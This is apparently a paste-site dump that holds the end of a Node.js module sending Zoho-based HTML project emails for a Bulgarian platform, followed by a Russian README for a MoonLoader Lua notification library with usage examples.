            Authorization: `Zoho-oauthtoken ${process.env.ZOHO_ACCESS_TOKEN}`,
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    });

    if (!response.ok) {
        const errorData = await response.json();
        if (errorData.data && errorData.data.errorCode === 'INVALID_OAUTHTOKEN') {
            process.env.ZOHO_ACCESS_TOKEN = await getZohoAccessToken();
            response = await fetch(url, {
                method: 'POST',
                headers: {
                    Authorization: `Zoho-oauthtoken ${process.env.ZOHO_ACCESS_TOKEN}`,
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            });
        }
        if (!response.ok) {
            throw new Error(`Failed to send email: ${JSON.stringify(errorData)}`);
        }
    }

    return response.json();
}

async function getZohoAccessToken() {
    const clientId = process.env.ZOHO_CLIENT_ID;
    const clientSecret = process.env.ZOHO_CLIENT_SECRET;
    const refreshToken = process.env.ZOHO_REFRESH_TOKEN;

    if (!clientId || !clientSecret || !refreshToken) {
        throw new Error('Missing required environment variables for Zoho access token.');
    }

    const url = `https://accounts.zoho.eu/oauth/v2/token`;
    const params = new URLSearchParams();
    params.append('refresh_token', refreshToken);
    params.append('client_id', clientId);
    params.append('client_secret', clientSecret);
    params.append('grant_type', 'refresh_token');

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: params.toString(),
        });

        if (!response.ok) {
            const errorData = await response.json();
            throw new Error(`Failed to fetch access token: ${errorData.error}`);
        }

        const responseData = await response.json();
        return responseData.access_token;
    } catch (error) {
        console.error('Error fetching access token:', error);
        throw error;
    }
}

async function sendProjectEmail({
    to,
    subject,
    message,
    title,
    description,
    category,
    applicationDeadline,
    currentParticipants,
    maxParticipants,
    status,
    location,
    link,
}) {
    const formattedSubject = `${subject}`;
    const formattedBody = `
        <html>
            <head>
                <meta charset=""UTF-8"">
                <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
            </head>
            <body style=""font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background: #f5f7fa; color: #222;"">
                <div style=""max-width: 800px; margin: 0 auto; background: #ffffff;"">
                    <!-- Header Table for Email Compatibility -->
                    <table width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""0"" style=""background: linear-gradient(to right, #FF7A3D, #FF965B); border-radius: 12px 12px 0 0;"">
                        <tr>
                            <td align=""center"" style=""padding: 32px 24px 0 24px;"">
                                <!-- Circle with Rocket -->
                                <table border=""0"" cellspacing=""0"" cellpadding=""0"" style=""margin: 0 auto;"">
                                    <tr>
                                        <td align=""center"" valign=""middle"" style=""
                                            background: rgba(255,255,255,0.15);
                                            border: none;
                                            border-radius: 50%;
                                            width: 80px;
                                            height: 80px;
                                            text-align: center;
                                            vertical-align: middle;
                                            padding-bottom: 5px;
                                            background-clip: padding-box;
                                            box-shadow: 0 0 0 0 transparent;
                                        "">
                                            <span style=""font-size: 40px; line-height: 80px; display: inline-block; width: 80px; height: 80px; margin-top: -2px;"">🚀</span>
                                        </td>
                                    </tr>
                                </table>
                                <!-- Pensa Club -->
                                <div style=""color: #fff; font-size: 28px; font-weight: 700; margin: 8px 0 4px 0; text-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center;"">
                                    Pensa Club
                                </div>
                                <!-- Subtitle -->
                                <div style=""color: rgba(255,255,255,0.9); font-size: 16px; font-weight: 400; margin: 0 0 12px 0; text-align: center;"">
                                    Социална платформа 
                                </div>
                            </td>
                        </tr>
                    </table>

                    <!-- Content -->
                    <div style=""padding: 24px 24px 16px 24px;"">
                        <div style=""
                            background: #f8fafc;
                            border-left: 4px solid #667eea;
                            padding: 14px 18px;
                            border-radius: 8px;
                            margin-bottom: 18px;
                        "">
                            <div style=""
                                color: #222;
                                font-size: 18px;
                                font-weight: 600;
                                margin-bottom: 6px;
                            "">
                                ${subject}
                            </div>
                        </div>

                        <div style=""
                            color: #222;
                            font-size: 16px;
                            line-height: 1.6;
                            margin-bottom: 18px;
                        "">
                            ${message}
                        </div>

                        <!-- Project Info -->
                        <div style=""
                            background: linear-gradient(135deg, #e6fffa 0%, #f0fff4 100%);
                            border: 1px solid #9ae6b4;
                            border-radius: 12px;
                            padding: 14px 18px;
                            margin-bottom: 18px;
                        "">
                            <h3 style=""
                                color: #222;
                                font-size: 16px;
                                font-weight: 600;
                                margin: 0 0 8px 0;
                            "">
                                📋 Информация за проекта
                            </h3>
                            <p style=""color: #222; font-size: 15px; margin: 0; line-height: 1.5;"">
                                <strong>Проект:</strong> ${title || ''}<br>
                                <strong>Описание:</strong> ${description || ''}<br>
                                <strong>Категория:</strong> ${category || '—'}<br>
                                <strong>Краен срок за кандидатстване:</strong> ${applicationDeadline ? new Date(applicationDeadline).toLocaleDateString('bg-BG') : '—'
        }<br>
                                <strong>Участници:</strong> ${currentParticipants || 0} / ${maxParticipants || '—'}<br>
                                <strong>Статус:</strong> ${status || '—'}<br>
                                <strong>Локация:</strong> ${location || '—'}
                            </p>
                        </div>

                        <!-- CTA -->
                        <div style=""text-align: center; margin: 18px 0;"">
                            <a href=""${link}"" style=""
                                background: linear-gradient(to right, #FF7A3D, #FF965B);
                                color: white;
                                padding: 10px 22px;
                                border-radius: 8px;
                                text-decoration: none;
                                font-weight: 600;
                                font-size: 16px;
                                display: inline-block;
                                box-shadow: 0 4px 12px rgb(247, 154, 79, 0.3);
                            "">
                                🌐 Виж страницата на проекта
                            </a>
                        </div>
                    </div>

                    <!-- Footer: always visible, no overflow, black text -->
                    <div style=""
                        background: #f7fafc;
                        padding: 14px 24px;
                        text-align: center;
                        border-top: 1px solid #e2e8f0;
                        border-radius: 0 0 12px 12px;
                        color: #222;
                    "">
                        <p style=""color: #222; font-size: 14px; margin: 0 0 8px 0;"">
                            Това съобщение е изпратено чрез платформата <strong>Pensa Club</strong>.
                        </p>
                        <p style=""color: #222; font-size: 12px; margin: 0;"">
                            Ако имате въпроси, свържете се с нас на <a href=""mailto:info@pensa.club"" style=""color: #222;"">info@pensa.club</a>
                        </p>
                        <p style=""color: #222; font-size: 11px; margin: 8px 0 0 0;"">
                            Благодарим Ви, че сте част от нашата общност!
                        </p>
                    </div>
                </div>
            </body>
        </html>
    `;

    const emailAddresses = Array.isArray(to) ? to : [to];

    for (const email of emailAddresses) {
        const data = {
            fromAddress: 'info@pensa.club',
            toAddress: email,
            subject: formattedSubject,
            content: formattedBody,
        };
        await sendZohoEmailRaw(data);
    }
}

module.exports = {
    sendResetEmail,
    forwardEmailsViaZoho,
    sendProjectEmail,
};
"
F4ZqFXAu,Notification.lua,Andergr0ynd,Lua,Sunday 6th of July 2025 01:12:18 AM CDT,"# Библиотека уведомлений для MoonLoader

Библиотека для создания красивых уведомлений с FontAwesome иконками в MoonLoader скриптах.

## Установка

1. Скопируйте файл `lib/notifications.lua` в папку `lib/` вашего MoonLoader
2. Убедитесь, что у вас установлены зависимости:
   - `mimgui`
   - `fAwesome6`
   - `inicfg`

## Быстрый старт

```lua
-- Подключаем библиотеку
local notifications = require 'lib.notifications'

-- Показываем уведомление
notifications.info(""Привет мир!"", 4000)
```

## Основные функции

### Показать уведомление
```lua
notifications.show(text, type, duration, custom_colors)
```

**Параметры:**
- `text` - текст уведомления
- `type` - тип уведомления (""success"", ""error"", ""warning"", ""info"", ""debug"")
- `duration` - длительность в миллисекундах (по умолчанию 4000)
- `custom_colors` - кастомные цвета (опционально)

### Типы уведомлений

#### Информация
```lua
notifications.info(""Информационное сообщение"", 4000)
```

#### Успех
```lua
notifications.success(""Операция выполнена успешно!"", 4000)
```

#### Ошибка
```lua
notifications.error(""Произошла ошибка!"", 4000)
```

#### Предупреждение
```lua
notifications.warning(""Внимание! Что-то пошло не так."", 4000)
```

#### Отладка
```lua
notifications.debug(""Отладочная информация"", 4000)
```

## Настройки

### Конфигурация библиотеки
```lua
notifications.configure({
    max_notifications = 5,        -- Максимальное количество уведомлений
    default_duration = 4000,      -- Длительность по умолчанию (мс)
    fade_in_time = 300,          -- Время появления (мс)
    fade_out_time = 300,         -- Время исчезновения (мс)
    position = ""bottom_left"",     -- Позиция по умолчанию
    movable = false              -- Возможность перетаскивания
})
```

### Позиции уведомлений
- `""top_right""` - Верхний правый угол
- `""top_left""` - Верхний левый угол
- `""bottom_right""` - Нижний правый угол
- `""bottom_left""` - Нижний левый угол (по умолчанию)
- `""center""` - Центр экрана

### Включение перетаскивания
```lua
notifications.set_interactive(true)  -- Включить перетаскивание
notifications.set_interactive(false) -- Отключить перетаскивание
```

## Управление уведомлениями

### Очистить все уведомления
```lua
notifications.clear()
```

### Получить количество активных уведомлений
```lua
local count = notifications.count()
print(""Активных уведомлений: "" .. count)
```

### Сохранить позиции
```lua
notifications.save_positions()
```

### Сбросить сохраненные позиции
```lua
notifications.reset_positions()
```

## Кастомные цвета

```lua
local custom_colors = {
    r = 0.2,  -- Красный (0.0 - 1.0)
    g = 0.8,  -- Зеленый (0.0 - 1.0)
    b = 0.2,  -- Синий (0.0 - 1.0)
    a = 0.9   -- Прозрачность (0.0 - 1.0)
}

notifications.info(""Уведомление с кастомными цветами"", 4000, custom_colors)
```

## Примеры использования

### Простой пример
```lua
local imgui = require 'mimgui'
local encoding = require 'encoding'
encoding.default = 'CP1251'
local u8 = encoding.UTF8
local ffi = require 'ffi'
local mem = require 'memory'
local socket_url = require 'socket.url'
local vkeys = require 'vkeys'
local mimgui_hotkeys = require 'mimgui_hotkeys'
local fAwesome6 = require 'fAwesome6'
local inicfg = require 'inicfg'

-- Подключаем библиотеку уведомлений
local notifications = require 'lib.notifications'

function main()
    -- Проверяем загрузку SAMP
    if not isSampfuncsLoaded() then
        sampAddChatMessage(u8'{FF0000}[Script] {FFFFFF}SAMP Functions не загружены!', -1)
        return
    end
    
    -- Ждем доступности SAMP
    while not isSampAvailable() do
        wait(100)
    end
    
    -- Показываем разные типы уведомлений
    notifications.info(""Скрипт загружен!"", 4000)
    wait(1000)
    
    notifications.success(""Все системы работают!"", 4000)
    wait(1000)
    
    notifications.warning(""Внимание! Проверьте настройки."", 4000)
    
    wait(-1)
end
```

### Пример с кастомными настройками
```lua
local notifications = require 'lib.notifications'

function main()
    -- Настраиваем библиотеку
    notifications.configure({
        max_notifications = 3,
        default_duration = 6000,
        position = ""top_right"",
        movable = true
    })
    
    -- Показываем уведомления
    notifications.info(""Настройки применены!"", 4000)
    
    wait(-1)
end
```

### Пример с кастомными цветами
```lua
local notifications = require 'lib.notifications'

function main()
    -- Кастомные цвета для уведомления
    local purple_colors = {
        r = 0.5,
        g = 0.2,
        b = 0.8,
        a = 0.9
    }
    
    notifications.info(""Специальное уведомление!"", 4000, purple_colors)
    
    wait(-1)
end
```

## Особенности

### Автоматическое скрытие курсора
- Курсор автоматически скрывается во время показа уведомлений
- Восстанавливается после исчезновения всех уведомлений

### FontAwesome иконки
- Все уведомления отображаются с соответствующими иконками
- Поддерживаются иконки FontAwesome 6

### Сохранение позиций
- При включенном перетаскивании позиции сохраняются автоматически
- Позиции восстанавливаются при перезапуске скрипта

### Анимации
- Плавное появление и исчезновение уведомлений
- Прогресс-бар показывает оставшееся время

## Файлы конфигурации

Библиотека создает файл `notification_positions.ini` для сохранения позиций уведомлений.

## Зависимости

- `mimgui` - для интерфейса
- `fAwesome6` - для иконок
- `inicfg` - для сохранения настроек
- `encoding` - для кодировки

## Поддерживаемые иконки

- **success**: `""check""` - галочка
- **error**: `""xmark""` - крестик
- **warning**: `""exclamation""` - восклицание
- **info**: `""info""` - информация
- **debug**: `""gear""` - шестеренка

## Устранение неполадок

### Иконки не отображаются
1. Убедитесь, что `fAwesome6` правильно установлен
2. Проверьте, что шрифт FontAwesome загружен

### Курсор не скрывается
1. Убедитесь, что используется последняя версия библиотеки
2. Проверьте, что нет конфликтов с другими скриптами

### Уведомления не появляются
1. Проверьте, что все зависимости установлены
2. Убедитесь, что SAMP загружен и доступен

## Лицензия

Библиотека распространяется свободно для использования в MoonLoader скриптах. "
